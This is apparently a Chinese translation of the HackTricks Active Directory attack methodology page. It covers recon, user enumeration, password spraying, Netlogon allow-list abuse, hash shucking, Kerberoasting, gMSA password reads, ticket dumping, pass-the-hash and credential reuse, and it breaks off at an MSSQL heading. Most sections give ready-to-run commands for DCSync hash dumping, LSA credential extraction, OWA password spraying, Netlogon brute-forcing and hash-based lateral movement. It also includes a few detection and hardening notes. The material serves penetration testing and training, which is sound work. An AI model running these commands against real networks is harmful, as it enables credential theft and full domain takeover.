# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使**网络管理员**能够高效地在网络中创建和管理**域**、**用户**和**对象**。它经过专门设计以支持扩展，可将大量用户组织到易于管理的**组**和**子组**中，同时控制各个层级的**访问权限**。

**Active Directory** 的结构由三个主要层级组成：**域**、**树**和**林**。**域**包含一组共享同一数据库的对象，例如**用户**或**设备**。**树**是通过共享结构相连的一组域，而**林**则由多个树组成，这些树通过**信任关系**互相连接，形成组织结构的最高层级。每个层级都可以指定特定的**访问权限**和**通信权限**。

**Active Directory** 中的关键概念包括：

1. **目录** – 存储与 Active Directory 对象相关的所有信息。
2. **对象** – 表示目录中的实体，包括**用户**、**组**或**共享文件夹**。
3. **域** – 作为目录对象的容器；一个**林**中可以有多个域，且每个域都维护自己的对象集合。
4. **树** – 共享同一个根域的一组域。
5. **林** – Active Directory 组织结构的最高层级，由多个树组成，树之间存在**信任关系**。

**Active Directory Domain Services (AD DS)** 包含一系列对网络中的集中管理和通信至关重要的服务，包括：

1. **域服务** – 集中存储数据并管理**用户**与**域**之间的交互，包括**身份验证**和**搜索**功能。
2. **证书服务** – 负责安全**数字证书**的创建、分发和管理。
3. **轻型目录服务** – 通过 **LDAP protocol** 支持启用目录功能的应用程序。
4. **目录联合服务** – 提供**单点登录**功能，使用户可以在单个会话中跨多个 Web 应用程序进行身份验证。
5. **权限管理** – 通过限制版权材料的未授权分发和使用，帮助保护这些材料。
6. **DNS 服务** – 对**域名**解析至关重要。

如需更详细的说明，请查看：[**TechTerms - Active Directory 定义**](https://techterms.com/definition/active_directory)

### **Kerberos 身份验证**

若要学习如何**攻击 AD**，你需要充分**理解** **Kerberos 身份验证流程**。\
[**如果你还不了解它的工作原理，请阅读此页面。**](kerberos-authentication.md)

## 速查表

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io)，快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos 通信通常**需要完全限定域名 (FQDN)**，以便客户端获取正确 SPN 对应的票据。通过 IP 地址访问计算机时，通常会回退到 NTLM，而不是 Kerberos。

## Recon Active Directory（无凭据/会话）

如果你只能访问 AD 环境，但没有任何凭据/会话，可以：

- **对网络进行 pentest：**
  - 扫描网络，查找计算机和开放端口，并尝试对其**利用漏洞**或**提取凭据**（例如，[打印机可能是很有价值的目标](ad-information-in-printers.md)）。
  - 枚举 DNS 可以获取域内关键服务器的信息，例如 Web、打印机、共享、VPN、媒体服务器等。
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 查看通用的[**Pentesting 方法论**](../../generic-methodologies-and-resources/pentesting-methodology.md)，了解更多操作方法。
- **检查 smb 服务是否允许 null 和 Guest 访问**（此方法在现代 Windows 版本上无法使用）：
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - 此处提供了更详细的 SMB 服务器枚举指南：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **枚举 Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - 此处提供了更详细的 LDAP 枚举指南（请**特别关注匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **投毒网络**
  - 通过[**使用 Responder 冒充服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)收集凭据
  - 通过[**滥用 relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)访问主机
  - 通过**暴露**[**伪造的 UPnP 服务，使用 evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)收集凭据
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
  - 从内部文档、社交媒体、域环境中的服务（主要是 Web）以及公开可用的信息中提取用户名/姓名。
  - 如果你找到了公司员工的全名，可以尝试不同的 AD **用户名规则 (**[**阅读此处**](https://activedirectorypro.com/active-directory-user-naming-convention/))。最常见的规则包括：_NameSurname_、_Name.Surname_、_NamSur_（两部分各取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个_随机字母和 3 个随机数字_（abc123）。
  - 工具：
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **匿名 SMB/LDAP 枚举：**查看[**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)和[**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)页面。
- **Kerbrute 枚举**：当服务器收到**无效用户名请求**时，会返回 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_，据此可以确定用户名无效。对于**有效用户名**，服务器会返回 **TGT in a AS-REP** 响应，或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要执行预身份验证。
- **针对 MS-NRPC 的无身份验证**：使用 auth-level = 1（无身份验证）访问域控制器上的 MS-NRPC (Netlogon) 接口。此方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，无需任何凭据即可检查用户或计算机是否存在。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现了这种枚举方式。相关研究可见[此处](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) 服务器**

如果你在网络中发现了这类服务器，也可以对其进行**用户枚举**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper)：

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> 你可以在[**这个 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)和这个 repo（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）中找到用户名列表。
>
> 不过，你应该已经从此前执行的 recon 步骤中获得了**公司员工的姓名**。有了名和姓，你就可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 生成可能有效的用户名。

### Netlogon 易受攻击通道允许列表滥用（Onelogon）

即使 DC 已修补 **Zerologon**，显式加入允许列表的账户仍可能受到**旧版/易受攻击的 Netlogon 安全通道行为**影响。存在风险的配置是 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 或对应的注册表值 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**。

该值是一个 **SDDL 安全描述符**（参见 [Security Descriptors](security-descriptors.md)）。任何在 DACL 中被授予相关 ACE 的账户或组都可能成为目标。例如，`O:BAG:BAD:(A;;RC;;;WD)` 实际上会将 **Everyone** 加入允许列表。

实际操作流程：

1. 检查 **SYSVOL/GPO** 和 **DC 实时注册表**，以**识别加入允许列表的主体**。
2. 将 SDDL 中的 SID **解析**为真实的 AD 用户/计算机，并优先关注 **DC 机器账户**、**信任账户**和其他特权机器。
3. 反复尝试以加入允许列表的账户进行 **MS-NRPC / Netlogon 身份验证**。
4. 猜测成功后，滥用 **Netlogon 密码设置**功能重置目标账户密码（公开 PoC 会将其设置为空字符串）。<sup>[[9]](#references)[[10]](#references)</sup>

公开 artifact 中的快速排查 / lab 示例：

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- **scanner** 很有用，因为有效的 allow-list 可能存在于 **SYSVOL**、**registry** 中，或两者都有。
- exploit path 本身很重要，因为一旦识别出易受攻击的账户，**就不需要 Domain Admin 权限**。
- 攻陷 **Domain Controller machine account**（例如 `DC$`）尤其危险，因为重置该密码可以直接开启更广泛的 **AD takeover** 路径。
- **Brute-force feasibility** 取决于模式：公开资料描述了 meet-in-the-middle 方法、在有其他 computer account 可用时进行 **24-bit** brute force，以及速度较慢的 **32-bit** 变体。

检测 / 加固注意事项：

- 审核 allow-list policy，移除所有内容，仅保留临时且明确要求的兼容性例外。
- 监控 DC **System** events **5827/5828/5829/5830/5831**，以发现易受攻击的 Netlogon connections 被拒绝、被发现或根据 policy 明确允许的情况。
- 在移除旧版依赖之前，将 `VulnerableChannelAllowList` 中的账户视为 **高风险**。

### 知道一个或多个用户名

好了，你已经知道有一个有效的用户名，但没有密码……那就试试：

- [**ASREPRoast**](asreproast.md)：如果用户**没有** _DONT_REQ_PREAUTH_ 属性，你可以为该用户**请求一条 AS_REP message**，其中会包含一些由该用户密码衍生出的密钥加密的数据。
- [**Password Spraying**](password-spraying.md)：尝试用最**常见的密码**登录每个已发现的用户，也许有用户使用了弱密码（请记住 password policy！）。
  - 注意，你也可以对 OWA servers 进行 **spray**，尝试访问用户的邮件服务器。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你也许可以通过对**网络**中的某些协议进行 **poisoning**，来**获取**一些可供破解的 challenge **hashes**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory 枚举可以提供用户名、电子邮件标识符和命名模式、候选主机，以及可能被诱导进行身份验证的服务。利用这些信息来识别可行的 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)，以及进入 AD 环境的潜在路径。

### NetExec workspace 驱动的 recon 与 relay 状态检查

- 使用 **`nxcdb` workspaces** 按 engagement 保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下为每种协议创建独立的 SQLite DB（smb/mssql/winrm/ldap 等）。使用 `proto smb|mssql|winrm` 切换视图，并使用 `creds` 列出收集到的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- 使用 **`netexec smb <cidr>`** 快速发现子网，可查看 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的成员容易受到 **relay** 攻击，而 DC 通常要求启用 signing。
- 直接根据 NetExec 输出在 /etc/hosts 中生成 **hostnames**，以便于定位目标：

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- 即使由于 signing 而**阻止 SMB relay 到 DC**，仍应检查 **LDAP** 配置：`netexec ldap <dc>` 会显示 `(signing:None)` / 弱 channel binding。若 DC 要求 SMB signing，但禁用了 LDAP signing，则它仍是可行的 **relay-to-LDAP** 目标，可用于 **SPN-less RBCD** 等攻击。

### 客户端打印机凭据泄露 → 批量验证域凭据

- 打印机/网页 UI 有时会在 HTML 中**嵌入经过掩码处理的管理员密码**。查看源代码或使用开发者工具可能会发现明文（例如 `<input value="<password>">`），从而通过 Basic-auth 访问扫描/打印存储库。
- 获取的打印作业可能包含带有每位用户密码的**明文入职文档**。测试时请确保配对关系保持一致：<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### 窃取 NTLM 凭据

如果你能使用**null 或 guest 用户** **访问其他 PC 或共享**，就可以**放置文件**（例如 SCF 文件）；如果这些文件被以某种方式访问，就会**触发对你进行 NTLM 身份验证**，让你能够**窃取** **NTLM challenge** 并尝试破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking 与 NT-Candidate 攻击

**Hash shucking** 会将你已持有的每个 NT hash 视为其他更慢格式的候选密码，这些格式的密钥材料直接从 NT hash 派生。你无需在 Kerberos RC4 tickets、NetNTLM challenges 或缓存凭据上暴力破解长密码短语，而是将 NT hash 输入 Hashcat 的 NT-candidate 模式，验证密码是否被重复使用，全程无需获取明文。这种方法在域遭到攻陷后尤其有效，因为你可以收集数千个当前和历史 NT hash。<sup>[[5]](#references)</sup>

以下情况适合使用 shucking：

- 你从 DCSync、SAM/SECURITY dumps 或凭据 vaults 获取了 NT hash 集合，需要测试这些密码是否在其他 domains/forests 中重复使用。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses 或 DCC/DCC2 blobs。
- 你想快速证明长且无法破解的密码短语被重复使用，并立即通过 Pass-the-Hash 横向转移。

此技术**不适用于**密钥并非 NT hash 的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制只使用 AES，则必须改用常规密码模式。

#### 构建 NT hash 集合

- **DCSync/NTDS** – 使用 `secretsdump.py` 并启用历史记录，尽可能获取更多 NT hash（及其先前值）：

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  历史记录会显著扩大候选池，因为 Microsoft 最多可为每个账户存储 24 个先前的 hash。有关收集 NTDS secrets 的更多方法，请参阅：

{{#ref}}
dcsync.md
{{#endref}}

- **端点缓存转储** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）会提取本地 SAM/SECURITY 数据和缓存的域登录凭据（DCC/DCC2）。去重后，将这些 hash 追加到同一个 `nt_candidates.txt` 列表中。
- **跟踪元数据** – 记录每个 hash 对应的用户名/域（即使 wordlist 只包含十六进制值）。当 Hashcat 输出破解出的候选密码时，匹配的 hash 会立即告诉你哪个主体重复使用了该密码。
- 优先使用来自同一 forest 或受信任 forest 的候选项；这样在 shucking 时最有可能出现重叠。

#### Hashcat NT 候选模式

| Hash 类型                                | 密码模式 | NT 候选模式 |
| ---------------------------------------- | ------------- | ----------------- |
| 域缓存凭据 (DCC)          | 1100          | 31500             |
| 域缓存凭据 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ 预身份验证      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT 候选输入**必须保持为原始的 32 位十六进制 NT hash**。禁用规则引擎（不要使用 `-r`，也不要使用混合模式），因为变换会破坏候选密钥材料。
- 这些模式本身并不会更快，但 NTLM 密钥空间（在 M3 Max 上约为 30,000 MH/s）比 Kerberos RC4（约为 300 MH/s）快约 100 倍。测试经过筛选的 NT 列表，远比在较慢的格式中遍历整个密码空间划算。
- 始终使用**最新的 Hashcat 构建版本**（`git clone https://github.com/hashcat/hashcat && make install`），因为 31500/31600/35300/35400 模式是最近才发布的。<sup>[[7]](#references)</sup>
- 目前 AS-REQ Pre-Auth 没有对应的 NT 模式；AES etype（19600/19700）需要明文密码，因为其密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而非直接使用原始 NT hash。

#### 示例 – Kerberoast RC4 (模式 35300)

1. 使用低权限用户为目标 SPN 捕获 RC4 TGS（详情请参阅 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. 使用你的 NT 列表 shuck 票据：

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat 会从每个 NT 候选项推导 RC4 密钥，并验证 `$krb5tgs$23$...` blob。匹配表示该服务帐户使用了你已有的某个 NT 哈希。

3. 立即通过 PtH 横向转移：

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   如有需要，之后可以使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### 示例 – 缓存凭据（模式 31600）

1. 从已攻陷的工作站转储缓存的登录凭据：

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt`，并破解它：

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 匹配成功后会得到你列表中已知的 NT hash，这就证明缓存用户重复使用了密码。可直接将其用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或使用快速 NTLM 模式进行 brute-force，以恢复明文。

完全相同的 workflow 也适用于 NetNTLM challenge-response（`-m 27000/27100`）和 DCC（`-m 31500`）。确认匹配后，你可以发起 relay、使用 SMB/WMI/WinRM PtH，或在离线状态下通过掩码/规则重新破解 NT hash。



## 使用凭据/会话枚举 Active Directory

此阶段需要**已攻陷有效域账户的凭据或会话**。如果你有有效凭据，或拥有域用户的 shell，**请记住，前面提到的方法仍可用于攻陷其他用户**。

开始经过身份验证的枚举前，请先了解 **Kerberos double-hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

攻陷一个账户是**评估域的重要一步**，因为这能让你进行经过身份验证的 **Active Directory 枚举**：

关于 [**ASREPRoast**](asreproast.md)，现在你可以找出所有可能存在漏洞的用户；关于 [**Password Spraying**](password-spraying.md)，你可以获取**所有用户名的列表**，并尝试使用已攻陷账户的密码、空密码以及新发现的潜在密码。

- 你可以使用[**CMD 进行基础信息收集**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**PowerShell 进行信息收集**](../basic-powershell-for-pentesters/index.html)，这样会更隐蔽
- 你也可以[**使用 powerview**](../basic-powershell-for-pentesters/powerview.md)提取更详细的信息
- Active Directory 信息收集的另一个出色工具是 [**BloodHound**](bloodhound.md)。它**不太隐蔽**（具体取决于你使用的收集方法），但**如果你不在意这一点**，一定要试试。查找哪些用户可以通过 RDP 登录、通往其他组的路径等。
  - **其他自动化 AD 枚举工具包括：** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- [**AD 的 DNS 记录**](ad-dns-records.md)可能包含有用的信息。
- 你可以使用 **SysInternal** Suite 中带 GUI 的工具 **AdExplorer.exe** 来枚举目录。
- 你也可以使用 **ldapsearch** 搜索 LDAP 数据库，在 _userPassword_ 和 _unixUserPassword_ 字段中查找凭据，或在用户的 _description_ 和 _info_ 备注中查找。_info_ 中未标明用途、但格式像密码的字符串只能视为候选项：应单独确认其用途和有效性，并避免在日常枚举输出中包含备注内容。其他方法见 [PayloadsAllTheThings 上的 AD 用户备注中的密码](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)。
- 在获得授权时，检查 `\\<dc>\NETLOGON` 或 `\\<dc>\SYSVOL\<domain>\scripts` 下**可访问**的域登录脚本和驱动器映射脚本。[Microsoft 文档](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)说明了 NETLOGON 共享的脚本目录用途。先列出文件名，再在大小限制内检查相关且可读的脚本；不要倾倒整个共享，也不要在日常枚举时输出凭据值。PowerShell 调用 [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **并不能保护脚本中以字面值存储的密码**。仅凭该调用不能证明密钥是硬编码的：应追踪实际输入，再单独验证账户、凭据有效性和权限。检查域脚本属于远程共享审查，与本机枚举不同。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举域。
- 你也可以尝试以下自动化工具：
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

  在 Windows 中，获取所有域用户名非常简单（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 中，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 虽然这个枚举部分看起来不长，但它是最重要的部分。访问相关链接（尤其是 CMD、PowerShell、powerview 和 BloodHound 的链接），学习如何枚举域并反复练习，直到熟练掌握。在评估过程中，这是找到通往 DA 的路径，或判断无计可施的关键时刻。

### 可预测的预创建计算机账户 -> gMSA 密码访问

为旧版加入流程预先创建的计算机账户可能保留可预测的初始密码。NetExec 的 `pre2k` 模块会识别特征性的 `userAccountControl` 值 `4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`），并尝试使用计算机名称的小写形式前 14 个字符（不含末尾的 `$`）获取 Kerberos TGT。应将此 UAC 值视为候选项筛选条件，不要仅凭账户属于 **Pre-Windows 2000 Compatible Access** 就认定其密码较弱。<sup>[[18]](#references)[[20]](#references)</sup>

使用经过身份验证的 LDAP 枚举测试候选项，并保存成功获取的 TGT。`ALL=True` 会将测试范围扩展到默认 `4128` 筛选条件之外的对象。<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

默认/NTLM bind 失败**并不**会使此发现失效：使用 `-k`、可解析到 DC 的 FQDN，以及与 KDC 同步的时钟进行测试。成功运行的模块会将候选列表和获取到的 ccaches 写入 `~/.nxc/modules/pre2k/`。<sup>[[18]](#references)[[20]](#references)</sup>

攻陷 computer principal 后，梳理其嵌套组成员关系和出站权限。特别是，gMSA 的 `msDS-GroupMSAMembership` 安全描述符中列出的 principal 可以读取 `msDS-ManagedPassword`；NetExec 的 `--gmsa` 输出会显示获准的 principal，并在进行身份验证的计算机获得授权时返回当前 NT hash。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Then 将恢复的 gMSA 与其他凭据一样进行评估：检查本地/域组成员身份、登录权限、SPN、委派和可访问的服务，然后再尝试 pass-the-hash。此基于 ACL 的获取路径不同于 [Golden gMSA/dMSA](golden-dmsa-gmsa.md)，后者是在 KDS root key 遭到泄露后推导托管密码。<sup>[[20]](#references)</sup>

计算机主体也可能对其他计算机对象或组拥有出站控制权限。获取此类主体后，应分别检查其嵌套成员关系和有效 ACL：对另一个计算机对象拥有写入权限可能允许更改账户，而组成员身份权限可能赋予登录角色。仅凭 staged-account 标志、可预测的命名约定或 `GenericWrite` 边，无法证明完整攻击路径。

文件、共享或备份中可读取的 `msDS-ManagedPassword` blob 属于另一种暴露途径：LDAP 读取 ACL 无法保护存储在其他位置的副本。解读数据前，先确认它是托管密码 blob，并将其与经过授权的 LDAP 读取和 KDS root key 推导区分开来。

### Kerberoast

Kerberoasting 涉及获取服务所用的 **TGS tickets**（这些服务与用户账户关联），并在**离线**状态下破解其基于用户密码的加密。

更多内容请参阅：

{{#ref}}
kerberoast.md
{{#endref}}

### 远程连接（RDP、SSH、FTP、Win-RM 等）

获取一些凭据后，可以检查自己是否能访问任何**计算机**。为此，可以根据端口扫描结果，使用 **CrackMapExec** 尝试通过不同协议连接多台服务器。

### 本地权限提升

如果你已攻陷凭据，或以普通域用户身份建立会话，并且能访问域中的**任何计算机**，就应寻找在本地**提升权限并收集凭据**的途径。本地管理员权限可能允许你从内存（LSASS）和本地存储（SAM）中**导出其他用户的哈希**。

本书中有完整页面介绍 [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html)，以及一份[**checklist**](../checklist-windows-privilege-escalation.md)。另外，别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### 当前会话票据

当前用户的**票据**中包含可让你访问意外资源的权限，这种情况**不太可能**，不过你可以检查：

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

使用域凭据或用户会话，重新查看 NTLM [**中继攻击**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)：经过身份验证的枚举和强制认证技术，可能会暴露在未认证侦察期间无法发现的中继路径。

### 在计算机共享 | SMB 共享中查找凭据

现在你有了一些基本凭据，应该检查能否在 AD 内部共享的文件中**找到**任何**有趣的文件**。你可以手动完成，但这会非常枯燥且重复（尤其是当你找到数百份需要检查的文档时）。

[**点击此处了解可用的工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### 窃取 NTLM 凭据

如果你能**访问其他 PC 或共享**，就可以**放置文件**（例如 SCF 文件）；如果有人访问这些文件，它们就会**触**发针对你的 NTLM 身份验证，这样你就能**窃取** NTLM **质询**并尝试破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何经过身份验证的用户**攻陷域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## 使用特权凭据/会话对 Active Directory 进行权限提升

**对于以下技术，普通域用户权限不足；你需要一些特殊权限/凭据才能执行这些攻击。**

### 提取哈希

希望你已经通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括中继）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) 或[本地权限提升](../windows-local-privilege-escalation/index.html)，**攻陷了某个本地管理员账户**。\
接下来，就该转储内存中和本地存储的所有哈希了。\
[**阅读此页面，了解获取哈希的不同方法。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**获得某个用户的哈希后**，你就可以用它来**冒充**该用户。\
你需要使用某种**工具**，通过该**哈希执行** **NTLM 身份验证**；或者，你也可以创建新的 **sessionlogon**，并将该**哈希注入** **LSASS**，这样执行任何 **NTLM 身份验证**时都会使用该**哈希**。mimikatz 使用的是后一种方法。\
[**阅读此页面了解更多信息。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM 哈希请求 Kerberos 票据**，作为常见的通过 NTLM 协议执行 Pass The Hash 的替代方法。因此，在**禁用 NTLM 协议**且只允许使用 **Kerberos** 作为身份验证协议的网络中，这种方法可能特别**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击中，攻击者会**窃取用户的身份验证票据**，而不是其密码或哈希值。随后，攻击者利用窃取的票据**冒充该用户**，未经授权访问网络中的资源和服务。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 凭据复用

如果你拥有某个**本地管理员**的**哈希**或**密码**，应该尝试使用它**本地登录**其他 **PC**。

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> 注意，这种做法会产生大量 **noise**，而 **LAPS** 可以对其进行 **mitigate**。

### MSSQL 滥用与受信任链接

